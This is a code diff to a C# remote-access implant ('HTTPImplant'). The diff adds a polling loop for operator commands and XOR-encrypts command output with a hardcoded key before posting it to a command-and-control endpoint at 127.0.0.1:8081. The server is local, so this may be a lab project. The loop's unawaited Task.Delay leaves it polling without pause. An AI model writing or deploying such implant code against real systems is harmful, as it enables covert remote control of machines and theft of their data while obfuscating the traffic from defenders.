@@ -5,18 +5,29 @@ using System.Reflection;
 using System.Text;
 using System.Timers;
 using HTTPImplant.Modules;
+using System.Runtime.InteropServices;
+using System.Threading.Tasks;
 
 namespace HTTPImplant
 {
     // This Implant class acts as the entry point of the implant program.
     public class Implant
     {
+
         public string host { get; set; }  // Host of the implant server
         public string port { get; set; }  // Port of the implant server
         private static string lastCommandExecuted = string.Empty; // Store the last command that was executed
 
         // Main method that is executed when the program is started.
         public static void Main(string[] args)
+        {
+            while (true)
+            {
+                Task.Delay(3000);
+                Do();
+            }
+        }
+        public static void Do()
         {
             string implantId = Environment.MachineName; // The ID of the implant is set as the machine's name
             var webClient = new WebClient(); // WebClient for communication with the server
@@ -90,19 +101,32 @@ namespace HTTPImplant
 
             // Start checking for commands from the server
             webClient.DownloadStringAsync(new Uri("http://127.0.0.1:8081/fetchCommand"));
-
-            // Keeps the console open to ensure that async tasks complete
-            Console.ReadLine();
         }
-
-        // Sends the results of the command execution back to the server
         public static void SendResult(WebClient webClient, string implantId, string operatorId, string outputBase64)
         {
+            // Create the JSON payload
             string resultJson = "{" + "\"ImplantId\": \"" + implantId + "\"," + "\"OperatorId\": \"" + operatorId + "\"," + "\"Output\": \"" + outputBase64 + "\"," + "\"DateFromLast\": \"" + DateTime.UtcNow.ToString("O") + "\"" + "}";
-            webClient.UploadStringCompleted += (sender2, e2) =>
+
+            Console.WriteLine(resultJson);
+
+            string XORKeyB64 = "NVm5dzr1hyhOm4jBTNSFhQGrFhR1gvhbn/BbvZowkO0=";
+            byte[] XORKey = Convert.FromBase64String(XORKeyB64);
+            byte[] encryptedResultJson = XOR(Encoding.UTF8.GetBytes(resultJson), XORKey);
+
+            // Proceed with sending results
+            webClient.UploadStringCompleted += (sender2, e2) => { };
+            string data = Convert.ToBase64String(encryptedResultJson);
+            webClient.UploadStringAsync(new Uri("http://127.0.0.1:8081/fetchOutput"), "POST", data);
+        }
+
+        public static byte[] XOR(byte[] data, byte[] key)
+        {
+            byte[] result = new byte[data.Length];
+            for (int i = 0; i < data.Length; i++)
             {
-            };
-            webClient.UploadStringAsync(new Uri("http://127.0.0.1:8081/fetchOutput"), "POST", resultJson);
+                result[i] = (byte)(data[i] ^ key[i % key.Length]);
+            }
+            return result;
         }
     }
 
